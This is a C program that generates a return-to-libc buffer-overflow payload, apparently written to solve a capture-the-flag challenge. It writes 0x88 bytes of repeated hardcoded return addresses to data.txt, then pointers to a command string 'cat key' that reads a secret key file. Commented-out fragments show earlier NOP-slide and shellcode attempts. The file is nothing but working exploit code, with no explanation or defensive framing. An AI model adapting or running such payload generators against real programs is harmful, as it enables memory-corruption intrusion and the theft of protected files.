#include <stdio.h>

int main (int argc, const char * argv[]) {
	FILE * fp = fopen("data.txt", "w");
	//void * ebpAddr = (void *)(0xffffd1FC - 20); // lower part of buffer
	void * retAddr = (void *)(0xf7e6b250);//0xFFFFD1FC; // upper part of buffer
	void * commandAddr = (void *)0xFFFFD1F4 + 4*11;
	//void * writeCall = (void *)0x80484d9; // the code which says hi
	int i;
	for (i = 0; i < 0x88 / 4; i++) {
		fwrite((unsigned char *)&retAddr, 4, 1, fp);
	}
	fwrite((unsigned char *)&retAddr, 4, 1, fp);
	fwrite((unsigned char *)&retAddr, 4, 1, fp);
	fwrite((unsigned char *)&commandAddr, 4, 1, fp);
	fwrite((unsigned char *)&commandAddr, 4, 1, fp);
	fwrite((unsigned char *)&commandAddr, 4, 1, fp);
	fwrite((unsigned char *)&commandAddr, 4, 1, fp);
	fprintf(fp, "cat key%c", 0x0);
	//fwrite((const char *)&ebpAddr, 4, 1, fp);
	//fwrite((const char *)&writeCall, 4, 1, fp);
	/*for (i = 0; i < 7; i++) {
		fwrite((void *)&retAddr, 4, 1, fp);
	}*/
	/*for (i = 0; i < 20; i++) {
		fprintf(fp, "%c", 0x90);
	}
	fclose(fp);*/
/*	fp = fopen("argument.txt", "w");
	for (i = 0; i < 512; i++) {
		fprintf(fp, "%c", 0x90); // mini NOP slide
	}
	fclose(fp);
*/
	//system("cat shellcode >>data.txt");
	return 0;
}
